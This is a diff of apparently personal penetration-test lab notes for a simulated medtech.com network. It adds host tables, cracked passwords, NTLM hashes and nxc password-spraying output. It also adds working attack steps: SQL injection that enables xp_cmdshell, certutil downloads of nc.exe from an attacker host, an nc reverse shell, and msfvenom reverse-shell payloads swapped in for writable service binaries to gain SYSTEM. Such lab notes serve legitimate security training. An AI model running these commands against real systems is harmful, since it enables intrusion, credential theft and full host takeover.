@@ -7,29 +7,49 @@ Recently formed IoT healthcare startup.
 
 # Hosts
 ## External
-192.168.x.120    proof.txt
-192.168.x.121 : WEB02     ~~proof.txt~~
-192.168.x.122    local.txt, proof.txt
+| IP            | Name  | Services         | Flags                |
+| ------------- | ----- | ---------------- | -------------------- |
+| 192.168.x.120 | PAW!  | ssh, http        | proof.txt            |
+| 192.168.x.121 | WEB02 | smb, http, winrm | ~~proof.txt~~        |
+| 192.168.x.122 | .     | ssh              | local.txt, proof.txt |
 
 ## Internal
-172.16.x.10 : DC            proof.txt
-172.16.x.11 : FILES02    ~~local.txt~~, ~~proof.txt~~
-172.16.x.12 : DEV04     ~~local.txt~~, proof.txt
-172.16.x.13 : PROD01   proof.txt
-172.16.x.14 :    local.txt
-172.16.x.82: CLIENT01     proof.txt
-172.16.x.83 : CLIENT02    local.txt, proof.txt
+| IP          | Name     | Services-nxc    | Flags                |
+| ----------- | -------- | --------------- | -------------------- |
+| 172.16.x.10 | DC       | smb, winrm      | proof                |
+| 172.16.x.11 | FILES02  | smb, winrm      | ~~local~~, ~~proof~~ |
+| 172.16.x.12 | DEV04    | smb, rdp, winrm | ~~local~~, ~~proof~~ |
+| 172.16.x.13 | PROD01   | smb, winrm      | proof                |
+| 172.16.x.14 | .        | ssh             | local                |
+| 172.16.x.82 | CLIENT01 | smb, rdp        | ~~proof~~            |
+| 172.16.x.83 | CLIENT02 | smb, winrm      | ~~local~~, ~~proof~~ |
+
 
 # Users & PWs
+```powershell
+net accounts
+	Force user logoff how long after time expires?:       Never
+	Minimum password age (days):                          1
+	Maximum password age (days):                          42
+	Minimum password length:                              5
+	Length of password history maintained:                24
+	Lockout threshold:                                    4
+	Lockout duration (minutes):                           30
+	Lockout observation window (minutes):                 30
+	Computer role:                                        SERVER
+```
+
 - joe
 	- NTLM - 08d7a47a6f9f66b97b1bae4178747494
 		- FILES 02 - Flowers1    (admin)
 	- NTLM - 464f388c3fe52a0fa0a6c8926d62059c
 - leon - domain admin
+	- rabbit!:)
 - mario
 - wario
 	- DC01 - Mushroom!
 	- DEV04 - Mushroom!
+	- CLIENT02 - Mushroom!
 	- NTLM - b82706aff8acf56b6c325a6c2d8c338a
 - peach
 - yoshi
@@ -41,6 +61,7 @@ Recently formed IoT healthcare startup.
 	- NTLM - b2c03054c306ac8fc5f9d188710b0168
 	- NTLM - f1014ac49bae005ee3ece5f47547d185
 	- NTLM - a7c5480e8c1ef0ffec54e99275e6e0f7
+	- NTLM - 00fd074ec24fd70c76727ee9b2d7aacd
 
 
 
@@ -58,7 +79,7 @@ nmap -v -p- --max-scan-delay=0 -oN e_121/all_ports.txt 192.168.x.121
 ';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure "xp_cmdshell", 1;RECONFIGURE;--
 
 -- Download nc.exe to target maching & run
-';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.x:8080/nc.exe c:/windows/temp/nc.exe";--
+';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.x/nc.exe c:/windows/temp/nc.exe";--
 ';EXEC xp_cmdshell "c:/windows/temp/nc.exe 192.168.45.x 12100 -e cmd.exe";--
 ```
 ####  Enumerate
@@ -274,4 +295,124 @@ nxc rdp 172.16.192.0/24 -d medtech.com -u users.txt -p Mushroom!
 	RDP         172.16.192.12   3389   DEV04            [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
 	RDP         172.16.192.82   3389   CLIENT01         [+] medtech.com\wario:Mushroom! 
 	RDP         172.16.192.82   3389   CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
+
+nxc winrm 172.16.239.0/24 -d medtech.com -u users.txt -p Mushroom!
+	WINRM       172.16.239.83   5985   CLIENT02         [+] medtech.com\wario:Mushroom! (Pwn3d!)
+
+nxc smb 172.16.239.13 -d medtech.com -u users.txt -p Mushroom!
+	SMB         172.16.239.13   445    PROD01           [+] medtech.com\wario:Mushroom!
+	SMB         172.16.239.13   445    PROD01           [+] medtech.com\joe:Flowers1
+```
+
+## 172.16.x.12
+#### Foothold & local.txt
+```bash
+xfreerdp /cert-ignore /v:172.16.x.12 /u:yoshi /p:Mushroom! 
+```
+	- Local.txt was right on the desktop
+#### Enumeration
+```powershell
+╔══════════╣ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
+     File Permissions "C:\TEMP\backup.exe": yoshi [WriteData/CreateFiles]
+```
+#### PrivEsc
+- In Kali
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.218 LPORT=1212 -f exe > backup.exe
+
+rlwrap nc -nlvp 1212
+```
+- In RDP session
+```powershell
+cd C:\TEMP
+
+move backup.exe backup.exe.bak
+
+certutil.exe -urlcache -f http://192.168.45.218/backup.exe backup.exe
+```
+- In revshell on Kali
+```powershell
+whoami
+	nt authority\system
+```
+#### proof.txt
+```powershell
+type C:\users\administrator\desktop\proof.txt
+```
+
+## 172.16.x.82
+#### Foothold
+```bash
+xfreerdp /cert-ignore /u:yoshi /p:Mushroom! /d:medtech.com /v:172.16.246.82
+```
+
+####  PrivEsc
+```powershell
+Start-Process powershell -Verb runAs
+```
+
+####  Enumeration & proof.txt
+```powershell
+Get-ChildItem -Path C:\users -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,password*,*.pdf -Recurse -ErrorAction SilentlyContinue -Force
+    Directory: C:\users\Administrator\Desktop
+		Mode                 LastWriteTime         Length Name
+		----                 -------------         ------ ----
+		-a----        11/14/2024   4:17 PM             34 proof.txt
+
+
+    Directory: C:\users\Administrator.MEDTECH\Searches
+		Mode                 LastWriteTime         Length Name
+		----                 -------------         ------ ----
+		-a----         10/5/2022   8:16 AM             14 hole.txt
+
+
+type C:\users\Administrator.MEDTECH\Searches\hole.txt
+	leon:rabbit!:)
+
+type C:\users\Administrator\Desktop
+```
+
+## 172.16.x.83
+#### Foothold
+```bash
+evil-winrm -i 172.16.239.83 -u wario -p "Mushroom\!"
+```
+#### local & Enumeration
+```powershell
+dir C:\users\wario\Desktop\
+	-a----        11/20/2024   2:24 PM             34 local.txt
+```
+#### WinPEAS
+```powershell
+   =================================================================================================
+
+    auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload - isDotNet
+    File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])
+    Tracks the security event log for audit events
+   =================================================================================================
+```
+#### PrivEsc & proof
+- In Kali
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=38383 -f exe > auditTracker.exe
+
+rlwrap nc -nlvp 38383
+```
+- In RDP session
+```powershell
+cd C:\DevelopmentExecutables
+
+move auditTracker.exe auditTracker.exe.bak
+
+certutil.exe -urlcache -f http://192.168.45.225/auditTracker.exe auditTracker.exe
+
+sc start auditTracker
+```
+- In revshell on Kali
+```powershell
+whoami
+	nt authority\system
+
+type C:\users\administrator\desktop\proof.txt
 ```
